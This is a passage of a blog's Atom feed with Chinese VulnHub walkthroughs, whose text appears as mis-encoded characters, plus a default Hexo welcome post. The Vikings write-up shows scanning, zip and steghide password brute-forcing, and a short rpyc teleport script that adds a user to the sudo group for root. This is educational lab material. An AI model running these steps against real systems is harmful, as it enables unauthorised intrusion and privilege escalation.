src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144327107.png" alt="image-20220216144327107"></p><h3 id="åˆ©ç”¨sudoææƒ"><a href="#åˆ©ç”¨sudoææƒ" class="headerlink" title="åˆ©ç”¨sudoææƒ"></a>åˆ©ç”¨sudoææƒ</h3><p>ç”¨æˆ·yousefæœ‰sudoæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥sudoæ‰§è¡Œæ‰€æœ‰å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144942569.png" alt="image-20220216144942569"></p><p>(è¿™é‡Œææƒå¤ªç®€å•äº†..)</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145157998.png" alt="image-20220216145157998"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145226424.png" alt="image-20220216145226424"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;é¶æœºåœ°å€ï¼š&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/y0usef/y0usef.ova&quot;&gt;https://download.vulnhub.com/y0usef/y0usef.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;éš¾åº¦ç­‰çº§ï¼š&lt;/strong&gt;ä½&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰“é¶ç›®æ ‡ï¼š&lt;/strong&gt;å–å¾— root æƒé™ + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-9-Vikings</title>
    <link href="http://example.com/2022/04/12/week9/"/>
    <id>http://example.com/2022/04/12/week9/</id>
    <published>2022-04-12T07:08:39.631Z</published>
    <updated>2022-04-12T07:11:41.051Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>é¶æœºåœ°å€ï¼š</strong><a href="https://download.vulnhub.com/vikings/Vikings.ova">https://download.vulnhub.com/vikings/Vikings.ova</a></p><p><strong>éš¾åº¦ç­‰çº§ï¼š</strong>ä½ï¼ˆä¸­ï¼‰</p><p><strong>æ‰“é¶ç›®æ ‡ï¼š</strong>å–å¾— root æƒé™ + 2 Flag</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092702262.png" alt="image-20220217092702262"></p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.123</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092741148.png" alt="image-20220217092741148"></p><h3 id="æœåŠ¡æ¢æµ‹"><a href="#æœåŠ¡æ¢æµ‹" class="headerlink" title="æœåŠ¡æ¢æµ‹"></a>æœåŠ¡æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80 -sV -sC 192.168.137.123</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092915869.png" alt="image-20220217092915869"></p><h3 id="è®¿é—®80ç«¯å£"><a href="#è®¿é—®80ç«¯å£" class="headerlink" title="è®¿é—®80ç«¯å£"></a>è®¿é—®80ç«¯å£</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092948159.png" alt="image-20220217092948159"></p><p>ç‚¹å‡»è¿›å…¥site&#x2F;</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093037864.png" alt="image-20220217093037864"></p><p>å°†é¡µé¢ä¸Šçš„ä¿¡æ¯è¿›è¡Œç¿»è¯‘</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222111544143.png" alt="image-20220222111544143"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093454464.png" alt="image-20220217093454464"></p><p>å‘ç°é¡µé¢åŠ è½½è¿‡ç¨‹ä¸­è¯·æ±‚äº†ä¸€äº›jsè„šæœ¬ï¼ˆæ‰€ä»¥åŠ è½½è¾ƒæ…¢ï¼‰ï¼Œä½†æœªå‘ç°å¯åˆ©ç”¨çš„ä¿¡æ¯</p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>å¯¹ç½‘ç«™æ ¹ç›®å½•è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.137.123/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112350381.png" alt="image-20220222112350381"></p><p>å¯¹&#x2F;siteè¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.137.123/site/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112536698.png" alt="image-20220222112536698"></p><p>å‘ç°war.txtï¼Œå°è¯•è®¿é—®</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112823666.png" alt="image-20220222112823666"></p><p>å‘ç°è¯¥æ–‡ä»¶å†…å†™äº†ç±»ä¼¼çš„è·¯å¾„ï¼Œç»§ç»­è®¿é—®è¯¥è·¯å¾„</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112919502.png" alt="image-20220222112919502"></p><h3 id="ç¼–ç è½¬åŒ–"><a href="#ç¼–ç è½¬åŒ–" class="headerlink" title="ç¼–ç è½¬åŒ–"></a>ç¼–ç è½¬åŒ–</h3><p>å‘ç°äº†å¤§é‡ç¼–ç ï¼Œå°è¯•è§£ç </p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113016678.png" alt="image-20220222113016678"></p><p>è§£ç åä¾ç„¶å¾ˆæ··ä¹±ï¼Œä½†æ˜¯å‘ç°å¼€å¤´PKåƒæ˜¯æ–‡ä»¶å¤´ï¼Œä½¿ç”¨ç†µè¾…åŠ©éªŒè¯ï¼ˆEntropyæ¨¡å—ï¼‰</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113409855.png" alt="image-20220222113409855"></p><p> ç†µå€¼å¤§äº7.5åˆ™å¤§æ¦‚ç‡æ˜¯äººä¸ºåˆ›å»ºçš„ï¼Œä½¿ç”¨Detect File Typeæ¨¡å—åˆ¤æ–­ç±»å‹</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113620160.png" alt="image-20220222113620160"></p><p>è¯¥æ–‡ä»¶åº”è¯¥ä¸ºä¸€ä¸ªå‹ç¼©æ ¼å¼çš„æ–‡ä»¶</p><p>å°†å…¶ä»¥å‹ç¼©æ–‡ä»¶æ ¼å¼ä¿å­˜åœ¨æœ¬åœ°</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152117585.png" alt="image-20220223152117585"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152138688.png" alt="image-20220223152138688"></p><p>æ‰“å¼€æ—¶å‘ç°éœ€è¦å¯†ç è§£å‹</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152314142.png" alt="image-20220223152314142"></p><h3 id="ç¦»çº¿ç ´è§£zipå¯†ç "><a href="#ç¦»çº¿ç ´è§£zipå¯†ç " class="headerlink" title="ç¦»çº¿ç ´è§£zipå¯†ç "></a>ç¦»çº¿ç ´è§£zipå¯†ç </h3><p>ä½¿ç”¨zip2johnå°†a.zipè½¬æ¢ä¸ºhash</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152747104.png" alt="image-20220223152747104"></p><p>å¤åˆ¶å­—å…¸ ä½¿ç”¨johnç ´è§£</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153101010.png" alt="image-20220223153101010"></p><h3 id="éšå†™å›¾ç‰‡ä¿¡æ¯æå–"><a href="#éšå†™å›¾ç‰‡ä¿¡æ¯æå–" class="headerlink" title="éšå†™å›¾ç‰‡ä¿¡æ¯æå–"></a>éšå†™å›¾ç‰‡ä¿¡æ¯æå–</h3><p>è§£å‹å‡ºä¸€å¼ å›¾ç‰‡ å¹³å¹³æ— å¥‡</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153714291.png" alt="image-20220223153714291"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153736524.png" alt="image-20220223153736524"></p><p>çŒœæµ‹æœ‰æ²¡æœ‰å¯èƒ½å’Œå›¾ç‰‡éšå†™ç›¸å…³</p><p>ä½¿ç”¨steghideæŸ¥çœ‹æ˜¯å¦å­˜åœ¨éšè—ä¿¡æ¯</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223154437101.png" alt="image-20220223154437101"></p><p>å‘ç°éœ€è¦è¾“å…¥å¯†ç  åˆæ­¥å°è¯•ä½¿ç”¨å¼±å£ä»¤ æœªèƒ½è¯•å‡ºå¯†ç </p><p>å¯ä»¥å°è¯•ä½¿ç”¨ç®€å•çš„è„šæœ¬è¿›è¡Œå¯†ç çˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat &quot;rockyou.txt&quot;); do steghide extract king -p $i; done</span><br></pre></td></tr></table></figure><h3 id="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†ææå–"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åˆ†ææå–" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åˆ†ææå–"></a>äºŒè¿›åˆ¶æ–‡ä»¶åˆ†ææå–</h3><p>è¿™é‡Œä½¿ç”¨binwalkäºŒè¿›åˆ¶åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -B king</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155430641.png" alt="image-20220223155430641"></p><p>åˆ†æç»“æœä¸­å‘ç° ç¡®å®å­˜åœ¨å‹ç¼©æ–‡ä»¶ æœ‰å‹ç¼©å‰åå¤§å°çš„ä¿¡æ¯ ä¸”åä¸ºuser</p><p>ä½¿ç”¨binwalkè¿›è¡Œæå–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e king</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155710305.png" alt="image-20220223155710305"></p><p>æå–åçš„zipæ–‡ä»¶è§£å‹åä¸ºuseræ–‡ä»¶</p><p>æŸ¥çœ‹useræ–‡ä»¶çš„ç±»å‹ å‘ç°ä¸ºtxtæ–‡ä»¶ åˆ™å°è¯•æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155926469.png" alt="image-20220223155926469"></p><p>çœ‹åˆ°è¿™æ ·çš„æ ¼å¼ä¸å…æƒ³åˆ°sshè¿æ¥ ï¼ˆç»“åˆä¹‹å‰ç«¯å£æ‰«æçš„22ç«¯å£ï¼‰ å°è¯•è¿æ¥</p><h3 id="sshç™»é™†flokiç”¨æˆ·"><a href="#sshç™»é™†flokiç”¨æˆ·" class="headerlink" title="sshç™»é™†flokiç”¨æˆ·"></a>sshç™»é™†flokiç”¨æˆ·</h3><p>ç»è¿‡å¤šæ¬¡å°è¯•æœ€ç»ˆä½¿ç”¨ç”¨æˆ·åflokiå’Œå¯†ç f@m0usboatbuilde7æˆåŠŸç™»é™†</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161401992.png" alt="image-20220223161401992"></p><h2 id="äºŒã€ææƒ"><a href="#äºŒã€ææƒ" class="headerlink" title="äºŒã€ææƒ"></a>äºŒã€ææƒ</h2><h3 id="sudoææƒ"><a href="#sudoææƒ" class="headerlink" title="sudoææƒ"></a>sudoææƒ</h3><p>ç®€å•æŸ¥çœ‹ä¸€ä¸‹å½“å‰æƒé™ä¸‹ç³»ç»Ÿçš„æ–‡ä»¶ä¿¡æ¯</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161707403.png" alt="image-20220223161707403"></p><p>å‘ç°ragnarç”¨æˆ· ä¹‹å‰åœ¨webé¡µé¢çš„æ–‡å­—ä¿¡æ¯å†…æœ‰æåˆ°è¿‡ragnarï¼ˆç»´äº¬äººçš„é¢†è¢–ï¼‰</p><p>å°è¯•åˆ‡æ¢åˆ°ragnarç”¨æˆ· å¤±è´¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su ragnar</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162049251.png" alt="image-20220223162049251"></p><p>å°è¯•è‡ªèº«æœ‰æ— sudoæƒé™ å°è¯•ææƒä¸ºroot ç»“æœæ˜¾ç¤ºå¹¶ésudoç»„æˆå‘˜ æ— æ³•ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162131315.png" alt="image-20220223162131315"></p><h3 id="ç´ æ•°æŸ¥æ‰¾-x2F-ç§‘æ‹‰èŒ¨çŒœæƒ³"><a href="#ç´ æ•°æŸ¥æ‰¾-x2F-ç§‘æ‹‰èŒ¨çŒœæƒ³" class="headerlink" title="ç´ æ•°æŸ¥æ‰¾&#x2F;ç§‘æ‹‰èŒ¨çŒœæƒ³"></a>ç´ æ•°æŸ¥æ‰¾&#x2F;ç§‘æ‹‰èŒ¨çŒœæƒ³</h3><p>å†å›åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶readme.txt</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162328006.png" alt="image-20220223162328006"></p><p>æ ¹æ®æ–‡æœ¬å†…çš„çº¿ç´¢ æŸ¥çœ‹ç›®å½•ä¸‹çš„boatæ–‡ä»¶çš„ç±»å‹</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162504160.png" alt="image-20220223162504160"></p><p>æŸ¥çœ‹ç›®å½•ä¸‹çš„boatæ–‡ä»¶çš„å†…å®¹</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162525657.png" alt="image-20220223162525657"></p><p>å‘ç°ä¼ªä»£ç ï¼ˆå¼€å‘äººå‘˜æ–¹ä¾¿ç†è§£çš„ä»£ç ï¼‰</p><p>å¤§è‡´æ„ä¸ºï¼š</p><blockquote><p>å¯æ‰“å°çš„å­—ç¬¦æ˜¯ä½ çš„ç›Ÿå‹</p><p>å°†å‚æ•°numèµ‹å€¼ä¸ºç¬¬29ä½ç´ æ•°</p><p>å¯¹å‚æ•°numè¿›è¡Œç§‘æ‹‰èŒ¨çŒœæƒ³</p></blockquote><p>ç”¨pythonå†™ä¸€ä¸ªè®¡ç®—ç´ æ•°çš„è„šæœ¬å¯»æ‰¾ç¬¬29ä¸ªç´ æ•°ä¸º109</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094526569.png" alt="image-20220303094526569"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094900556.png" alt="image-20220303094900556"></p><p>ç”¨pythonå†™ä¸€ä¸ªå¯¹109è¿›è¡Œç§‘æ‹‰èŒ¨çŒœæƒ³çš„è„šæœ¬ï¼Œæç¤ºä¸­æœ‰å¯æ‰“å°çš„å­—ç¬¦ï¼Œasciiç¼–ç æœ€å¤§ä¸º255æ•…&lt;256</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100126604.png" alt="image-20220303100126604"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100152569.png" alt="image-20220303100152569"></p><p>å°†æ‰“å°å‡ºæ¥çš„å­—ç¬¦æ”¾å…¥CyberChefä¸­</p><p>ä½¿ç”¨From Decimalæ¨¡å—å¹¶è®¾ç½®é—´éš”ä¸ºé€—å·ï¼Œå†ä½¿ç”¨Stringsæ¨¡å—å¹¶é€‰æ‹©é•¿åº¦ä¸º1çš„å¯æ‰“å°å­—ç¬¦</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100735715.png" alt="image-20220303100735715"></p><p>æœ€ç»ˆå†ä½¿ç”¨Find&#x2F;Replaceæ¨¡å— å°†æ¢è¡Œç¬¦æ›¿æ¢ä¸ºç©º</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100824928.png" alt="image-20220303100824928"></p><p>å¾—åˆ°æœ€ç»ˆçš„å­—ç¬¦ä¸²<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code></p><h3 id="sshç™»é™†ragnarç”¨æˆ·"><a href="#sshç™»é™†ragnarç”¨æˆ·" class="headerlink" title="sshç™»é™†ragnarç”¨æˆ·"></a>sshç™»é™†ragnarç”¨æˆ·</h3><p>å°è¯•ä½¿ç”¨è¯¥å­—ç¬¦ä¸²ä½œä¸ºå¯†ç ç™»é™†ragnarè´¦å·</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104008438.png" alt="image-20220303104008438"></p><p>å†æ¬¡å°†<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code>ç²˜è´´è¾“å…¥</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104318996.png" alt="image-20220303104318996"></p><p>æˆåŠŸç™»å…¥ï¼Œæç¤ºä¿¡æ¯æ˜¾ç¤ºragnarç”¨æˆ·ä¹Ÿä¸æ˜¯rootç”¨æˆ·ï¼Œæ²¡æœ‰sudoæƒé™</p><h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¿¡æ¯ï¼Œuser.txtå†…åº”ä¸ºç¬¬ä¸€ä¸ªflag</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104541477.png" alt="image-20220303104541477"></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwdæ–‡ä»¶</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104737747.png" alt="image-20220303104737747">é¡ºä¾¿ä¼˜åŒ–ä¸€ä¸‹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104824167.png" alt="image-20220303104824167"></p><p>é‡æ–°æ€è€ƒä¹‹å‰sshç™»é™†ragnarè´¦å·æ—¶ï¼Œç™»é™†æˆåŠŸåä»éœ€å†è¾“å…¥å¯†ç ï¼Œæ€€ç–‘æ˜¯å­˜åœ¨ç™»é™†å³è¿è¡Œçš„ç¨‹åºæˆ–è¿›ç¨‹</p><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰æ— éšè—æ–‡ä»¶</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105052770.png" alt="image-20220303105052770"></p><h3 id="Rpcæ¼æ´ææƒ"><a href="#Rpcæ¼æ´ææƒ" class="headerlink" title="Rpcæ¼æ´ææƒ"></a>Rpcæ¼æ´ææƒ</h3><p>æŸ¥çœ‹ç¯å¢ƒå˜é‡æ–‡ä»¶ æœ€ç»ˆå‘ç°åœ¨.profileæ–‡ä»¶å†…å¯èƒ½å­˜åœ¨å¯åˆ©ç”¨ä¿¡æ¯</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105227689.png" alt="image-20220303105227689"></p><p>å‘ç°åœ¨sshç™»é™†åï¼Œä¼šå®‰è£…å’Œé…ç½®libpam-umaskåŒ…ï¼Œå¹¶ç›´æ¥ä½¿ç”¨<strong>sudo</strong>æƒé™è¿è¡Œäº†pythonè„šæœ¬**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;rpyc_classic.py**</p><p>æŸ¥çœ‹**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;rpyc_classic.py**</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303111707601.png" alt="image-20220303111707601"></p><p>äº†è§£ä¸€ä¸‹rpcï¼ˆæœåŠ¡ç«¯ã€å®¢æˆ·ç«¯è¿æ¥æ–¹å¼ç­‰ï¼‰</p><p><a href="https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html">https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html</a></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112050194.png" alt="image-20220303112050194"></p><p>å‘ç°å¯ç”±å®¢æˆ·ç«¯å°†å‡½æ•°ä¼ è¾“åˆ°æœåŠ¡ç«¯å¹¶æ‰§è¡Œ</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112630757.png" alt="image-20220303112630757"></p><p>æŸ¥çœ‹è¯¥æ–‡ä»¶æ˜¯å¦æœ‰å†™æƒé™</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112323137.png" alt="image-20220303112323137"></p><p>æ™®é€šç”¨æˆ·æ— æ³•å†™å…¥&#x2F;æ›´æ”¹</p><p>æ•´ç†å¤§è‡´æ€è·¯ï¼šåˆ©ç”¨å®¢æˆ·ç«¯å¯ä»¥å‘æœåŠ¡ç«¯ä¼ è¾“æ•°æ®çš„ç‰¹æ€§ï¼Œå‘æœåŠ¡ç«¯ä¼ è¾“æ•°æ®ï¼ŒæœåŠ¡ç«¯é»˜è®¤ä»¥rootæƒé™æ‰§è¡Œï¼Œåˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œå°†ragnarç”¨æˆ·æ·»åŠ åˆ°sudoç»„</p><p>ç¼–å†™exp</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161022685.png" alt="image-20220303161022685"></p><blockquote><p>import rpyc<br>def shell():<br>   import os<br>   os.system(â€œsudo usermod -a -G sudo ragnarâ€)<br>conn &#x3D; rpyc.classic.connect(â€œlocalhostâ€)<br>fn &#x3D; conn.teleport(shell)<br>fn()</p></blockquote><p>æŸ¥çœ‹Rpycæ–‡æ¡£å†…æåˆ°çš„é»˜è®¤æœåŠ¡ç«¯å£18812æ˜¯å¦åœ¨æœ¬æœºå¼€å¯</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303154936087.png" alt="image-20220303154936087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -pantu | grep 18812</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303155200284.png" alt="image-20220303155200284"></p><p>ç»“æœæ˜¾ç¤ºæœåŠ¡ç«¯å£18812çš„çŠ¶æ€æ˜¯å¼€å¯ï¼Œä¹Ÿå°±è¯´æ˜æœåŠ¡ç«¯æ˜¯åœ¨è¿è¡Œçš„</p><p>æ‰§è¡Œexpï¼Œå¹¶é‡æ–°ä½¿ç”¨sshç™»é™†ragnarè´¦å·ï¼ŒéªŒè¯æ˜¯å¦æˆåŠŸ</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303160356664.png" alt="image-20220303160356664"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161344973.png" alt="image-20220303161344973"></p><p>é¡µé¢æç¤ºè¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œä½¿ç”¨sudoæ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œä½¿ç”¨<code>sudo -s</code> æ‰§è¡Œç¯å¢ƒå˜æ•°ä¸­çš„ SHELL</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161509841.png" alt="image-20220303161509841"></p><h3 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h3><p>æœ€ç»ˆæˆåŠŸææƒè‡³rootæƒé™å¹¶è·å–ç¬¬äºŒä¸ªflag</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161726600.png" alt="image-20220303161726600"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;é¶æœºåœ°å€ï¼š&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/vikings/Vikings.ova&quot;&gt;https://download.vulnhub.com/vikings/Vikings.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;éš¾åº¦ç­‰çº§ï¼š&lt;/strong&gt;ä½ï¼ˆä¸­ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰“é¶ç›®æ ‡ï¼š&lt;/strong&gt;å–å¾— root æƒé™ + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/04/12/hello-world/"/>
    <id>http://example.com/2022/04/12/hello-world/</id>
    <published>2022-04-12T07:02:12.926Z</published>
    <updated>2022-04-12T07:02:12.926Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo 